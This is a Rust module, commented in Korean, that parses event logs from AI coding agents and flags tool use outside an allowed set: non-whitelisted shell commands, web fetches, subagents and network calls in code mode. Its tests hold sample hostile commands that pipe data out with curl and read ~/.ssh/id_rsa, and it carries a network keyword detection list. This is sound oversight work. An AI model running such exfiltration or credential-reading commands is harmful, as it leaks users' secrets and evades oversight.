//! AI 출력(JSON 줄) 읽기 — 엔진마다 다른 꼴에서 지금 하는 일 · 오류 · 마지막 답 · 도구 사용을 뽑는다.
//! 도구 사용은 감지(PES 밖 조사 흔적)에 쓴다: 허용 밖 도구 · 셸 명령 · 내장 웹 가져오기 · ego-browser 직접 부르기.
use crate::engine::{Engine, SHELL_OK};
use serde_json::{Value, json};

#[derive(Debug, PartialEq)]
pub enum Ev {
    Phase(&'static str, Option<String>),
    Fail(String),
    Done(String),
    /// 도구를 썼다(이름, 셸이면 명령)
    Tool(String, Option<String>),
}

fn s(v: &Value, p: &str) -> String {
    v.pointer(p)
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_string()
}

pub fn parse(engine: Engine, m: &Value) -> Vec<Ev> {
    let ty = s(m, "/type");
    let mut out = Vec::new();
    match engine {
        Engine::Claude => match ty.as_str() {
            "stream_event" => match (
                s(m, "/event/type").as_str(),
                s(m, "/event/content_block/type").as_str(),
            ) {
                ("content_block_start", "thinking") => out.push(Ev::Phase("thinking", None)),
                ("content_block_start", "text") => out.push(Ev::Phase("writing", None)),
                ("content_block_start", "tool_use") => {
                    out.push(Ev::Phase("tool", Some(s(m, "/event/content_block/name"))))
                }
                _ => {}
            },
            "assistant" => {
                for c in m
                    .pointer("/message/content")
                    .and_then(Value::as_array)
                    .into_iter()
                    .flatten()
                {
                    if c.get("type").and_then(Value::as_str) == Some("tool_use") {
                        out.push(Ev::Tool(
                            s(c, "/name"),
                            c.pointer("/input/command")
                                .and_then(Value::as_str)
                                .map(str::to_string),
                        ));
                    }
                }
            }
            "user" => out.push(Ev::Phase("thinking", None)),
            "result" => {
                if m.get("is_error").and_then(Value::as_bool) == Some(true)
                    || s(m, "/subtype") != "success"
                {
                    let r = s(m, "/result");
                    out.push(Ev::Fail(if r.is_empty() { s(m, "/subtype") } else { r }));
                } else {
                    out.push(Ev::Done(s(m, "/result")));
                }
            }
            _ => {}
        },
        Engine::Codex => {
            let it = m.get("item").unwrap_or(&Value::Null);
            let started = ty == "item.started";
            match ty.as_str() {
                "turn.started" => out.push(Ev::Phase("thinking", None)),
                "item.started" | "item.completed" => match s(it, "/type").as_str() {
                    "reasoning" => out.push(Ev::Phase("thinking", None)),
                    "agent_message" => {
                        out.push(Ev::Phase("writing", None));
                        let t = s(it, "/text");
                        if !started && !t.is_empty() {
                            out.push(Ev::Done(t));
                        }
                    }
                    "command_execution" => {
                        out.push(Ev::Phase("tool", Some("Bash".to_string())));
                        if started {
                            out.push(Ev::Tool("Bash".to_string(), Some(s(it, "/command"))));
                        }
                    }
                    "mcp_tool_call" => {
                        // 시작이면 Tool 하나(부른 쪽이 신호도 「도구」로 바꾼다), 끝이면 신호만
                        let tool = s(it, "/tool");
                        if started {
                            out.push(Ev::Tool(format!("mcp__{}__{tool}", s(it, "/server")), None));
                        } else {
                            out.push(Ev::Phase("tool", Some(tool)));
                        }
                    }
                    "web_search" => {
                        out.push(Ev::Phase("tool", Some("WebSearch".to_string())));
                        if started {
                            out.push(Ev::Tool("WebSearch".to_string(), None));
                        }
                    }
                    "error" => out.push(Ev::Fail(s(it, "/message"))),
                    // 하위 에이전트(협업 도구 · spawn_agent 등) — 감지에 넘긴다
                    t if started && (t.contains("collab") || t.contains("agent")) => {
                        out.push(Ev::Tool("subagent".to_string(), Some(t.to_string())))
                    }
                    _ => {}
                },
                "turn.failed" => out.push(Ev::Fail(s(m, "/error/message"))),
                "error" => out.push(Ev::Fail(s(m, "/message"))),
                _ => {}
            }
        }
        Engine::OpenCode => match ty.as_str() {
            "step_start" => out.push(Ev::Phase("thinking", None)),
            "text" => {
                out.push(Ev::Phase("writing", None));
                let t = s(m, "/part/text");
                if !t.is_empty() {
                    out.push(Ev::Done(t));
                }
            }
            "tool_use" => {
                let t = s(m, "/part/tool");
                if s(m, "/part/state/status") == "running" {
                    out.push(Ev::Phase("tool", Some(t)));
                } else {
                    // 셸은 command, code mode(execute)는 code — 감지에서 둘 다 본다
                    let input = m
                        .pointer("/part/state/input/command")
                        .or_else(|| m.pointer("/part/state/input/code"));
                    out.push(Ev::Tool(
                        t,
                        input.and_then(Value::as_str).map(str::to_string),
                    ));
                }
            }
            "error" => {
                let msg = [
                    s(m, "/error/data/message"),
                    s(m, "/error/message"),
                    s(m, "/error"),
                ]
                .into_iter()
                .find(|x| !x.is_empty())
                .unwrap_or_else(|| "오류".to_string());
                out.push(Ev::Fail(msg));
            }
            _ => {}
        },
    }
    out
}

/// PES MCP 도구 이름(pes-web src/mcp.ts TOOLS, 2026-11-28) — OpenCode 의 pes_<도구> 이름을 가린다
const PES_TOOLS: [&str; 37] = [
    "list_projects",
    "get_project",
    "list_items",
    "get_item",
    "search",
    "update_item",
    "edit_blocks",
    "list_report_kinds",
    "create_project",
    "get_start_questions",
    "answer_start_questions",
    "answer_review",
    "approve_stage",
    "answer_chat",
    "get_chat_file",
    "send_instruction",
    "pending_work",
    "my_docs_search",
    "law_notice_search",
    "law_notice_text",
    "keep_source",
    "rag_pending_docs",
    "rag_doc",
    "rag_annotate",
    "get_skill",
    "get_place_jobs",
    "get_place_job",
    "submit_place",
    "get_polish",
    "submit_polish",
    "start_round",
    "merge_items",
    "submit_round",
    "list_memory",
    "add_memory",
    "make_image",
    "read_more",
];

/// 셸 감싸개(/bin/zsh -lc '…' · bash -c "…")를 벗긴다
fn unwrap_shell(cmd: &str) -> &str {
    let t = cmd.trim();
    for w in [
        "/bin/zsh -lc ",
        "/bin/bash -lc ",
        "bash -lc ",
        "zsh -lc ",
        "/bin/sh -c ",
        "sh -c ",
        "bash -c ",
    ] {
        if let Some(rest) = t.strip_prefix(w) {
            let r = rest.trim();
            for q in ['\'', '"'] {
                if let Some(inner) = r.strip_prefix(q).and_then(|x| x.strip_suffix(q)) {
                    return inner;
                }
            }
            return r;
        }
    }
    t
}

/// 셸 명령이 허용한 보조 명령(jq · grep · cat)만으로 되어 있나 — 파이프 · && · ; 로 나눈 마디마다 본다
pub fn shell_ok(cmd: &str) -> bool {
    let c = unwrap_shell(cmd);
    // 작은따옴표 안은 셸이 풀지 않는다 — 비운다(jq '.a | select(.b)' 같은 식이 걸리지 않게)
    let s1 = mask(c, '\'');
    // 명령 치환은 큰따옴표 안에서도 돈다
    if ["`", "$(", "${"].iter().any(|x| s1.contains(x)) {
        return false;
    }
    let s2 = mask(&s1, '"');
    // 프로세스 치환 · 하위 셸 · 리다이렉션 · 묶음 · 줄 이음은 보조 명령 밖이다
    if ["<(", ">(", ">", "<", "(", ")", "{", "}", "\\"]
        .iter()
        .any(|x| s2.contains(x))
    {
        return false;
    }
    s2.split(['|', ';', '&', '\n'])
        .map(str::trim)
        .filter(|x| !x.is_empty())
        .all(|seg| {
            let first = seg.split_whitespace().next().unwrap_or_default();
            let base = first.rsplit('/').next().unwrap_or(first);
            SHELL_OK.contains(&base)
        })
}

/// 따옴표 q 로 묶인 곳의 안을 빈칸으로(따옴표는 남긴다)
fn mask(s: &str, q: char) -> String {
    let mut inside = false;
    s.chars()
        .map(|ch| {
            if ch == q {
                inside = !inside;
                ch
            } else if inside {
                ' '
            } else {
                ch
            }
        })
        .collect()
}

/// 도구 사용 하나가 PES 밖 조사 흔적인가 → 그렇다면 {tool, command?, why}
pub fn outside(engine: Engine, name: &str, command: Option<&str>) -> Option<Value> {
    let n = name.trim();
    let lower = n.to_ascii_lowercase();
    // PES 도구: Claude · Codex 는 mcp__<서버>__<도구>, OpenCode 는 <서버>_<도구>. 서버는 pes · pes_local 만
    let pes_tool = n.starts_with("mcp__pes__")
        || n.starts_with("mcp__pes_local__")
        || n.starts_with("pes_local_")
        || n.strip_prefix("pes_")
            .is_some_and(|t| PES_TOOLS.contains(&t));
    // 내장 웹 검색은 켜 둔다(단서용) — 감지 대상이 아니다. 파일 읽기 도구는 작업 폴더 안으로 갇혀 있다
    let plain = matches!(
        lower.as_str(),
        "websearch"
            | "web_search"
            | "read"
            | "glob"
            | "grep"
            | "list"
            | "todowrite"
            | "todoread"
            | "yield"
            | "skill"
    );
    let why = if pes_tool || plain {
        None
    } else if matches!(lower.as_str(), "webfetch" | "web_fetch" | "fetch") {
        Some("내장 웹 가져오기")
    } else if matches!(lower.as_str(), "bash" | "shell") {
        match command {
            Some(c) if c.contains("ego-browser") => Some("ego-browser 를 셸로 직접 부름"),
            Some(c) if shell_ok(c) => None,
            Some(_) => Some("허용 밖 셸 명령"),
            None => None,
        }
    } else if lower == "task" || lower == "agent" || lower == "subagent" {
        Some("하위 에이전트")
    } else if engine == Engine::OpenCode && (lower == "execute" || lower == "codemode") {
        // OpenCode code mode — 안의 MCP 호출은 따로 잡히지 않는다(한계). 코드에 네트워크 · 프로세스 흔적이 있으면 표시한다
        let code = command.unwrap_or_default().to_ascii_lowercase();
        [
            "fetch(",
            "http://",
            "https://",
            "webfetch",
            "child_process",
            "xmlhttprequest",
            "websocket",
            "bun.spawn",
            "deno.run",
        ]
        .iter()
        .any(|k| code.contains(k))
        .then_some("code mode 안의 네트워크 · 프로세스 흔적")
    } else {
        Some("허용 밖 도구")
    };
    why.map(|w| json!({ "tool": n, "command": command.map(|c| c.chars().take(300).collect::<String>()), "why": w }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn claude_events() {
        let m = json!({"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"curl -s https://x"}}]}});
        assert_eq!(
            parse(Engine::Claude, &m),
            vec![Ev::Tool("Bash".into(), Some("curl -s https://x".into()))]
        );
        let r = json!({"type":"result","subtype":"success","result":"끝"});
        assert_eq!(parse(Engine::Claude, &r), vec![Ev::Done("끝".into())]);
        let f = json!({"type":"result","subtype":"error_max_turns","is_error":true});
        assert_eq!(
            parse(Engine::Claude, &f),
            vec![Ev::Fail("error_max_turns".into())]
        );
    }

    #[test]
    fn codex_events() {
        let m = json!({"type":"item.started","item":{"type":"command_execution","command":"/bin/zsh -lc 'jq . a.json'"}});
        let ev = parse(Engine::Codex, &m);
        assert!(ev.contains(&Ev::Tool(
            "Bash".into(),
            Some("/bin/zsh -lc 'jq . a.json'".into())
        )));
        let c = json!({"type":"item.completed","item":{"type":"agent_message","text":"답"}});
        assert!(parse(Engine::Codex, &c).contains(&Ev::Done("답".into())));
        let x = json!({"type":"item.started","item":{"type":"mcp_tool_call","server":"pes_local","tool":"kosis"}});
        assert!(parse(Engine::Codex, &x).contains(&Ev::Tool("mcp__pes_local__kosis".into(), None)));
    }

    #[test]
    fn opencode_events() {
        let m = json!({"type":"tool_use","part":{"tool":"webfetch","state":{"status":"completed","input":{"url":"https://x"}}}});
        assert!(parse(Engine::OpenCode, &m).contains(&Ev::Tool("webfetch".into(), None)));
        let e = json!({"type":"error","error":{"data":{"message":"Variant unavailable"}}});
        assert_eq!(
            parse(Engine::OpenCode, &e),
            vec![Ev::Fail("Variant unavailable".into())]
        );
    }

    #[test]
    fn shell_rules() {
        assert!(shell_ok("jq .a /x.json"));
        assert!(shell_ok("/bin/zsh -lc 'cat a.txt | grep 인구'"));
        assert!(!shell_ok("curl https://example.com"));
        assert!(!shell_ok("cat a | curl -d @- https://x"));
        assert!(!shell_ok("cat $(curl x)"));
        assert!(!shell_ok("jq . a > /tmp/b"));
    }

    #[test]
    fn outside_detection() {
        assert!(outside(Engine::Claude, "mcp__pes_local__kosis", None).is_none());
        assert!(outside(Engine::Claude, "WebSearch", None).is_none());
        assert!(outside(Engine::Claude, "Bash", Some("grep -n a b")).is_none());
        assert!(outside(Engine::Claude, "WebFetch", None).is_some());
        assert!(outside(Engine::Claude, "Bash", Some("curl https://x")).is_some());
        assert!(outside(Engine::Claude, "Bash", Some("ego-browser nodejs -e x")).is_some());
        assert!(outside(Engine::OpenCode, "webfetch", None).is_some());
        assert!(outside(Engine::OpenCode, "task", None).is_some());
        assert!(outside(Engine::Codex, "Bash", Some("/bin/zsh -lc 'python3 -c 1'")).is_some());
    }

    #[test]
    fn review_cases() {
        assert!(!shell_ok("cat <(curl -s https://x)"));
        assert!(!shell_ok("grep x ${HOME}/.ssh/id_rsa > /dev/null"));
        assert!(!shell_ok("(curl x)"));
        assert!(
            shell_ok("jq '.rows | map(select(.v > 1))' a.json"),
            "작은따옴표 안의 jq 식은 괜찮다"
        );
        assert!(!shell_ok("grep \"$(curl x)\" a"));
        assert!(outside(Engine::OpenCode, "pes_merge_items", None).is_none());
        assert!(outside(Engine::OpenCode, "pes_local_kosis", None).is_none());
        assert!(
            outside(Engine::OpenCode, "pes_evil_tool", None).is_some(),
            "pes_ 로 시작해도 PES 도구가 아니면 흔적"
        );
        assert!(outside(Engine::OpenCode, "skill", None).is_none());
        assert!(
            outside(
                Engine::OpenCode,
                "execute",
                Some("await fetch('https://x')")
            )
            .is_some()
        );
        assert!(
            outside(
                Engine::OpenCode,
                "execute",
                Some("await tools.pes_local.kosis({})")
            )
            .is_none()
        );
        let c =
            json!({"type":"item.started","item":{"type":"collab_tool_call","tool":"spawn_agent"}});
        let evs = parse(Engine::Codex, &c);
        assert!(
            evs.iter()
                .any(|e| matches!(e, Ev::Tool(n, _) if n == "subagent"))
        );
        assert!(outside(Engine::Codex, "subagent", Some("collab_tool_call")).is_some());
        let x = json!({"type":"tool_use","part":{"tool":"execute","state":{"status":"completed","input":{"code":"fetch('https://a')"}}}});
        assert!(parse(Engine::OpenCode, &x).contains(&Ev::Tool(
            "execute".into(),
            Some("fetch('https://a')".into())
        )));
    }
}
